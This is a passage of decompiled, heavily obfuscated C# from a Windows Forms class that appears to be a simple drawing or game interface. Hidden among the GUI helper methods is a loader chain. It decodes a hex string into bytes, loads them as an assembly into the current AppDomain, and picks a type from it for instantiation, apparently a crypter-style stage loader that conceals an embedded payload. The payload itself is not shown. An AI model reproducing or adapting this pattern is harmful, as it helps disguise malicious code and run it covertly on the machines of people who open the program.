					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 537336282) ^ -827890600;
					continue;
				case 10u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 2077036396) ^ -23622515;
					continue;
				case 9u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1265439178) ^ -1897474765;
					continue;
				case 8u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 918833218) ^ 0x4A2B1331);
					continue;
				case 7u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -781570420) ^ 0x53A5ABC5;
					continue;
				case 6u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)((num2 * 238370728) ^ 0x6F86114F);
					continue;
				case 5u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1007742384) ^ -904456108;
					continue;
				case 4u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -1351951977) ^ 0x46FDC1B;
					continue;
				case 3u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 28983753) ^ -523397253;
					continue;
				case 2u:
					num = (int)(num2 * 335049184) ^ -653828725;
					continue;
				case 1u:
					num = (int)(num2 * 368360771) ^ -1763578305;
					continue;
				default:
					return;
				case 0u:
					break;
				case 79u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = -904005804;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCC916F70u) % 3u)
				{
				case 1u:
					goto IL_0009;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = (int)((num2 * 888199218) ^ 0x7161427);
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 428783297;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7DC45A60u) % 4u)
				{
				case 2u:
					num = (int)(num2 * 1613671168) ^ -1276561789;
					continue;
				case 1u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)((num2 * 1621971938) ^ 0xBE5C15C);
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
